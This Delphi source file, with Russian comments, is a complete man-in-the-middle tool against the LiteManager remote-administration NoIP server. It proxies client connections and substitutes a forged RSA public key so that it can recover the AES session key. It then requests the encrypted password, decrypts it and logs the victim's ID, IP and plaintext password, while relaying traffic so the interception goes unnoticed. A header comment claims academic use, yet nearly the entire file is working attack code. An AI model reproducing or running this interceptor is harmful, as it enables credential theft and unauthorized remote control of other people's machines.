(*
  Перехват паролей для LMNoIpServer.exe
  Использовать только в академических целях
*)
unit MainForm;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, Vcl.StdCtrls, Vcl.Samples.Spin, IdContext,
  IdTCPConnection, IdTCPClient, IdGlobal, System.SyncObjs, Vcl.ExtCtrls,
  Vcl.ComCtrls, wcrypt2, Vcl.Clipbrd;

type
  TAppForm = class(TForm)
    PortLable: TLabel;
    PortNumber: TSpinEdit;
    Start: TButton;
    Output: TMemo;
    SocketServer: TIdTCPServer;
    ServerAddressEdit: TEdit;
    ServerAddressLable: TLabel;
    TimerOutput: TTimer;
    StatusBar: TStatusBar;
    ClearIgnore: TButton;
    CopyClipboard: TButton;
    procedure StartClick(Sender: TObject);
    procedure SocketServerExecute(AContext: TIdContext);
    procedure TimerOutputTimer(Sender: TObject);
    procedure ClearIgnoreClick(Sender: TObject);
    procedure CopyClipboardClick(Sender: TObject);
  private
    FServerAddress: string;
    FServerPort: Integer;
    FLogOutput: TStringList;
    FLogCS: TCriticalSection;
    FCryptoAPICS: TCriticalSection;
    FIgnoreList: TStringList;
    FIgnoreListCS: TCriticalSection;

    procedure OutputDebug(const AText: string);
    procedure IgnoreId(const AId: string);
    function GenerateRealSessionKey(APublicKeyData: TBytes; var ASessionKey: TBytes): Boolean;
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
  end;

var
  AppForm: TAppForm;

implementation

const
  PROV_RSA_AES    = 24;
  ALG_SID_AES_256 = 16;
  CALG_AES_256    = (ALG_CLASS_DATA_ENCRYPT or ALG_TYPE_BLOCK or ALG_SID_AES_256);

{$R *.dfm}

procedure TAppForm.ClearIgnoreClick(Sender: TObject);
begin
  FIgnoreListCS.Enter;
  try
    FIgnoreList.Clear;
  finally
    FIgnoreListCS.Leave;
  end;
end;

procedure TAppForm.CopyClipboardClick(Sender: TObject);
begin
  Clipboard.AsText := Output.Text;
end;

constructor TAppForm.Create(AOwner: TComponent);
begin
  inherited Create(AOwner);

  FLogOutput := TStringList.Create;
  FLogCS := TCriticalSection.Create;
  FCryptoAPICS := TCriticalSection.Create;
  FIgnoreList := TStringList.Create;
  FIgnoreList.Sorted := True;
  FIgnoreListCS := TCriticalSection.Create;
end;

destructor TAppForm.Destroy;
begin
  FLogOutput.Free;
  FLogCS.Free;
  FCryptoAPICS.Free;
  FIgnoreList.Free;
  FIgnoreListCS.Free;

  inherited;
end;

function TAppForm.GenerateRealSessionKey(APublicKeyData: TBytes; var ASessionKey: TBytes): Boolean;
var
  FuncResult: Boolean;
  CryptoProviderHandle: HCRYPTPROV;
  PublicKey, SessionKey: HCRYPTKEY;
  KeySize, DataLen: DWORD;
begin
  Result := False;

  CryptoProviderHandle := 0;
  PublicKey := 0;
  SessionKey := 0;

  FCryptoAPICS.Enter;
  try
    FuncResult := CryptAcquireContext(
      @CryptoProviderHandle,
      nil,
      nil,
      PROV_RSA_AES,
      CRYPT_VERIFYCONTEXT
    );
    if not FuncResult then
    begin
      OutputDebug('GenerateRealSessionKey CryptAcquireContext fatal error: ' + GetLastError.ToString);
      Exit;
    end;

    // Импортируем реальный открытый ключ от Server
    FuncResult := CryptImportKey(
      CryptoProviderHandle,
      @APublicKeyData[0],
      Length(APublicKeyData),
      0,
      CRYPT_EXPORTABLE,
      @PublicKey
    );
    if not FuncResult then
    begin
      OutputDebug('GenerateRealSessionKey CryptImportKey fatal error: ' + GetLastError.ToString);
      Exit;
    end;

    KeySize := 256;

    // Генерируем AES ключ
    FuncResult := CryptGenKey(
      CryptoProviderHandle,
      CALG_AES_256,
      (KeySize shl 16) or CRYPT_EXPORTABLE,
      @SessionKey
    );
    if not FuncResult then
    begin
      OutputDebug('GenerateRealSessionKey CryptGenKey fatal error: ' + GetLastError.ToString);
      Exit;
    end;

    // Извлекаем AES, определяем размер
    FuncResult := CryptExportKey(
      SessionKey,
      PublicKey,
      SIMPLEBLOB,
      0,
      nil,
      @DataLen
    );
    if not FuncResult then
    begin
      OutputDebug('GenerateRealSessionKey CryptExportKey size fatal error: ' + GetLastError.ToString);
      Exit;
    end;

    // Данные AES ключа
    SetLength(ASessionKey, DataLen);
    FuncResult := CryptExportKey(
      SessionKey,
      PublicKey,
      SIMPLEBLOB,
      0,
      @ASessionKey[0],
      @DataLen
    );
    if not FuncResult then
    begin
      OutputDebug('GenerateRealSessionKey CryptExportKey data fatal error: ' + GetLastError.ToString);
      Exit;
    end;

    Result := True;
  finally
    if PublicKey <> 0 then
      CryptDestroyKey(PublicKey);

    if SessionKey <> 0 then
      CryptDestroyKey(SessionKey);

    if CryptoProviderHandle <> 0 then
      CryptReleaseContext(CryptoProviderHandle, 0);

    FCryptoAPICS.Leave;
  end;
end;

procedure TAppForm.IgnoreId(const AId: string);
begin
  FIgnoreListCS.Enter;
  try
    if FIgnoreList.IndexOf(AId) < 0 then
      FIgnoreList.Add(AId);
  finally
    FIgnoreListCS.Leave;
  end;
end;

procedure TAppForm.OutputDebug(const AText: string);
var
  S: string;
begin
  FLogCS.Enter;
  try
    S := FormatDateTime('zzzz:ss:nn:hh dd.mm.yy| ', Now);
    FLogOutput.Add(S + AText);
  finally
    FLogCS.Leave;
  end;
end;

(*
  Этот метод вызывается в отдельных потоках, при каждом соединении к нашему
  перехватчику. В нем и обрабатываем трафик от клиентских и админских модулей LM,
  перенаправляя его в LMNoIpServer.exe
*)
procedure TAppForm.SocketServerExecute(AContext: TIdContext);
var
  Client: TIdTCPClient;
  Data, PasswordData: TMemoryStream;
  Val32, Size: Int32;
  //Val8: Byte;
  S, Id, Ip: string;
  Password: AnsiString;
  FuncResult: Boolean;

  CryptoProviderHandle: HCRYPTPROV;
  FakePublicKey, SessionKey: HCRYPTKEY;
  KeySize, DataLen: DWORD;
  PublicKeyData, RealPublicKeyData, RealSessionKeyData, SessionKeyData: TBytes;
begin
  Ip := AContext.Connection.Socket.Binding.PeerIP;
  //OutputDebug('Connection form IP: ' + AContext.Connection.Socket.Binding.PeerIP);
  FakePublicKey := 0;
  SessionKey := 0;
  Client := TIdTCPClient.Create(nil);
  try
    Client.UseNagle := False;
    Client.Host := FServerAddress;
    Client.Port := FServerPort;

    Client.Connect;
    try
      // Единица обычно
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));
      if Val32 <> 1 then
        Exit;

      // Скорее всего тип соединения
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));

      // Нас интересует тип соединения == 3, это канал Server <> NOIP
      if Val32 <> 3 then
        Exit;

      // Версия со стороны Viewer, например, 00 00 12 d4, то есть 4820
      Val32 := Client.IOHandler.ReadInt32();
      //OutputDebug('Version: ' + Val32.ToString);
      AContext.Connection.IOHandler.Write(Int32(Val32));

      // Версия со стороны Server
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));
      //OutputDebug('Version Server: ' + Val32.ToString);

      // 00 00 00 02
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));
      //OutputDebug('00 00 00 02: ' + Val32.ToString);
      if Val32 <> 2 then
        Exit;

      // Какая-то строка, обычно "--"
      S := AContext.Connection.IOHandler.ReadLn();
      Client.IOHandler.WriteLn(S);
      //OutputDebug('Some string: ' + S);

      // ID сохраним на будущее!
      Id := AContext.Connection.IOHandler.ReadLn();
      Client.IOHandler.WriteLn(Id);
      //OutputDebug('ID: ' + Id);

      // Проверим, есть ли ID в списке игнорирования
      FIgnoreListCS.Enter;
      try
        if FIgnoreList.IndexOf(Id) >= 0 then
          Exit;
      finally
        FIgnoreListCS.Leave;
      end;

      // ID в формате UTF-16 зачем-то
      S := AContext.Connection.IOHandler.ReadLn(IndyTextEncoding_UTF16LE);
      Client.IOHandler.WriteLn(S, IndyTextEncoding_UTF16LE);
      //OutputDebug('ID UTF-16: ' + S);

      // Далее работа ведется не с NOIP, а с Server
      // Скорее всего тип соединения, для авторизации это всегда 3
      Val32 := Client.IOHandler.ReadInt32();
      AContext.Connection.IOHandler.Write(Int32(Val32));

      // Если не 3, то нам не интересно
      if Val32 <> 3 then
        Exit;

      // Какой-то внутренний GUID
      S := Client.IOHandler.ReadLn();
      AContext.Connection.IOHandler.WriteLn();
      //OutputDebug('GUID: ' + S);

      // Судя по всему, признак авторизации, всегда == 0 в интересующем нас сценарии
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));
      if Val32 <> 0 then
        Exit;

      // Магическая цифра 00 00 03 09 (777) со стороны Viewer
      Val32 := Client.IOHandler.ReadInt32();
      AContext.Connection.IOHandler.Write(Int32(Val32));
      //OutputDebug('777 - 1: ' + Val32.ToString);
      if Val32 <> 777 then
        Exit;

      // Магическая цифра 00 00 03 09 (777) со стороны Server
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));
      //OutputDebug('777 - 2: ' + Val32.ToString);
      if Val32 <> 777 then
        Exit;

      // Опять версия, например, 00 00 12 d4 (4820)
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));

      // Какое-то число, обычно 00 00 00 01
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));

      // Какое-то число, обычно 00 00 00 00
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));

      // Какая-то обычно пустая строка, судя по признаку окончания 0d 0a
      S := AContext.Connection.IOHandler.ReadLn();
      Client.IOHandler.WriteLn(S);

      // Скорее всего какая-то настройка авторизации,
      // должна быть == 3 по нашему сценарию
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      Client.IOHandler.Write(Int32(Val32));
      if Val32 <> 3 then
        Exit;

      // Номер версии со стороны Viewer
      Val32 := Client.IOHandler.ReadInt32();
      AContext.Connection.IOHandler.Write(Int32(Val32));

      // 4 байта нулей
      Val32 := Client.IOHandler.ReadInt32();
      AContext.Connection.IOHandler.Write(Int32(Val32));
      // Еще 4 байта нулей
      Val32 := Client.IOHandler.ReadInt32();
      AContext.Connection.IOHandler.Write(Int32(Val32));

      // Начинается работа с RSA, нужно сгенерировать и подменить ключи

      // Размер данных RSA балока, но пока не отсылаем его!
      Val32 := AContext.Connection.IOHandler.ReadInt32;
      //OutputDebug('RSA open key size: ' + Val32.ToString);

      // Считываем данные RSA блока, но не отсылаем их!
      Data := TMemoryStream.Create;
      try
        AContext.Connection.IOHandler.ReadStream(Data, Val32);
        Data.Position := 0;
        SetLength(RealPublicKeyData, Data.Size);
        Data.Read(RealPublicKeyData, Data.Size);
      finally
        FreeAndNil(Data);
      end;

      // Импортируем реальный RSA ключ и сгенерируем AES (делаем работу вместо реального Viewer)
      if not GenerateRealSessionKey(RealPublicKeyData, RealSessionKeyData) then
      begin
        OutputDebug('GenerateRealSessionKey error');
        Exit;
      end;

      // Генерируем новый (fake) RSA блок и отсылаем его вместо старого
      FCryptoAPICS.Enter;
      try
        FuncResult := CryptAcquireContext(
          @CryptoProviderHandle,
          nil,
          nil,
          PROV_RSA_AES,
          CRYPT_VERIFYCONTEXT
        );
        if not FuncResult then
        begin
          OutputDebug('CryptAcquireContext fatal error: ' + GetLastError.ToString);
          Exit;
        end;

        KeySize := 2048;

        // Создаем новые открытый и закрытый ключи
        FuncResult := CryptGenKey(
          CryptoProviderHandle,
          AT_KEYEXCHANGE,
          KeySize shl 16,
          @FakePublicKey
        );
        if not FuncResult then
        begin
          OutputDebug('CryptGenKey fatal error: ' + GetLastError.ToString);
          Exit;
        end;

        // Извлекаем открытый ключ, определяем размер
        FuncResult := CryptExportKey(
          FakePublicKey,
          0,
          PUBLICKEYBLOB,
          0,
          nil,
          @DataLen
        );
        if not FuncResult then
        begin
          OutputDebug('CryptExportKey size fatal error: ' + GetLastError.ToString);
          Exit;
        end;

        // Данные открытого ключа
        SetLength(PublicKeyData, DataLen);
        FuncResult := CryptExportKey(
          FakePublicKey,
          0,
          PUBLICKEYBLOB,
          0,
          @PublicKeyData[0],
          @DataLen
        );
        if not FuncResult then
        begin
          OutputDebug('CryptExportKey data fatal error: ' + GetLastError.ToString);
          Exit;
        end;
      finally
        FCryptoAPICS.Leave;
      end;

      // Отсылаем на Viewer новый RSA блок
      Data := TMemoryStream.Create;
      try
        Data.Write(PublicKeyData[0], Length(PublicKeyData));
        Data.Position := 0;

         // Размер нового блока RSA
        Val32 := Data.Size;
        //OutputDebug('RSA open key NEW size: ' + Val32.ToString);
        Client.IOHandler.Write(Int32(Val32));
        // Данные
        Client.IOHandler.Write(Data, Data.Size);
      finally
        FreeAndNil(Data);
      end;

      // Считываем размер AES ключа
      Size := Client.IOHandler.ReadInt32();

      // Отсылаем раземр реального AES ключа на Server
      Val32 := Length(RealSessionKeyData);
      AContext.Connection.IOHandler.Write(Int32(Val32));

      Data := TMemoryStream.Create;
      PasswordData := TMemoryStream.Create;
      try
        // Считываем AES ключ
        Client.IOHandler.ReadStream(Data, Size);
        //OutputDebug('AES key from Viewer: ' + Val32.ToString);

        // Сохраним данные AES ключа
        SetLength(SessionKeyData, Data.Size);
        Data.Position := 0;
        Data.Read(SessionKeyData, Data.Size);

        // Отсылаем реальный AES ключ на Server
        Data.Clear;
        Data.Write(RealSessionKeyData, Length(RealSessionKeyData));
        Data.Position := 0;
        AContext.Connection.IOHandler.Write(Data, Data.Size);

        // У нас реализован только перехват безопасности по паролю
        // В LM есть и другие виды безопасности, нас интересует == 1
        Val32 := AContext.Connection.IOHandler.ReadInt32;
        if Val32 <> 1 then
        begin
          // Следующие разы этот ID не перехватываем
          IgnoreId(Id);
          Exit;
        end;

        // С Server больше не работаем, все, что необходимо уже получено

        // Запросим пароль
        Client.IOHandler.Write(Int32(1));

        // Считываем размер данных с зашифрованным паролем
        Val32 := Client.IOHandler.ReadInt32();
        // Считываем зашифрованный пароль
        Client.IOHandler.ReadStream(PasswordData, Val32);

        // Далее с сетью больше не работаем в этом потоке и игнорируем в будущем этот ID
        IgnoreId(Id);

        // Восстановим данные AES ключа
        Data.Clear;
        Data.Write(SessionKeyData, Length(SessionKeyData));
        Data.Position := 0;

        FCryptoAPICS.Enter;
        try
          // Импорт AES ключа
          FuncResult := CryptImportKey(
            CryptoProviderHandle,
            Data.Memory,
            Data.Size,
            FakePublicKey,
            0,
            @SessionKey
          );
          if not FuncResult then
          begin
            OutputDebug('CryptImportKey fatal error: ' + GetLastError.ToString);
            Exit;
          end;

          PasswordData.Position := 0;
          DataLen := PasswordData.Size;

          // Пробуем расшифровать пароль AES ключом
          FuncResult := CryptDecrypt(
            SessionKey,
            0,
            True,
            0,
            PasswordData.Memory,
            @DataLen
          );
          if not FuncResult then
          begin
            OutputDebug('CryptDecrypt fatal error: ' + GetLastError.ToString);
            Exit;
          end;

          PasswordData.Size := DataLen;
          PasswordData.Position := 0;
          SetLength(Password, PasswordData.Size);
          PasswordData.Read(Pointer(Password)^, PasswordData.Size);

          OutputDebug('ID: ' + Id);
          OutputDebug('IP: ' + Ip);
          OutputDebug('Password: ' + string(Password));
          OutputDebug('--------------------');
        finally
          FCryptoAPICS.Leave;
        end;
      finally
        FreeAndNil(Data);
        FreeAndNil(PasswordData);
      end;

    finally
      // Проксирование трафика, без изменений и анализа, в LMNoIpServer.exe
      Data := TMemoryStream.Create;
      try
        while (AContext.Connection.Connected) and (Client.Connected) do
        begin
          AContext.Connection.IOHandler.CheckForDataOnSource(1);
          if AContext.Connection.IOHandler.InputBuffer.Size > 0 then
          begin
            Data.Clear;
            AContext.Connection.IOHandler.InputBuffer.ExtractToStream(Data);
            if Data.Size > 0 then
            begin
              Data.Position := 0;
              Client.IOHandler.Write(Data, Data.Size);
            end;
          end;
          Client.IOHandler.CheckForDataOnSource(1);
          if Client.IOHandler.InputBuffer.Size > 0 then
          begin
            Data.Clear;
            Client.IOHandler.InputBuffer.ExtractToStream(Data);
            if Data.Size > 0 then
            begin
              Data.Position := 0;
              AContext.Connection.IOHandler.Write(Data, Data.Size);
            end;
          end;
        end;
      finally
        FreeAndNil(Data);
      end;
    end;
  finally
    Client.Free;

    FCryptoAPICS.Enter;
    try
      if FakePublicKey <> 0 then
        CryptDestroyKey(FakePublicKey);

      if SessionKey <> 0 then
        CryptDestroyKey(SessionKey);

      if CryptoProviderHandle <> 0 then
        CryptReleaseContext(CryptoProviderHandle, 0);
    finally
      FCryptoAPICS.Leave;
    end;

    if AContext.Connection.Connected then
      AContext.Connection.Disconnect;
  end;
end;

procedure TAppForm.StartClick(Sender: TObject);
begin
  if ServerAddressEdit.Text = '' then
    Exit;

  SocketServer.DefaultPort := PortNumber.Value;
  FServerAddress := ServerAddressEdit.Text;
  FServerPort := PortNumber.Value;
  SocketServer.Active := True;
  Start.Enabled := False;

  OutputDebug('Run');
end;

procedure TAppForm.TimerOutputTimer(Sender: TObject);
begin
  FLogCS.Enter;
  try
    if FLogOutput.Count > 0 then
    begin
      Output.Lines.AddStrings(FLogOutput);
      FLogOutput.Clear;
    end;
  finally
    FLogCS.Leave;
  end;

  StatusBar.SimpleText := 'Context count: ' + SocketServer.Contexts.Count.ToString;

  // Скролл вниз
  SendMessage(Output.Handle, EM_LINESCROLL, 0, Output.Lines.Count);
end;

end.
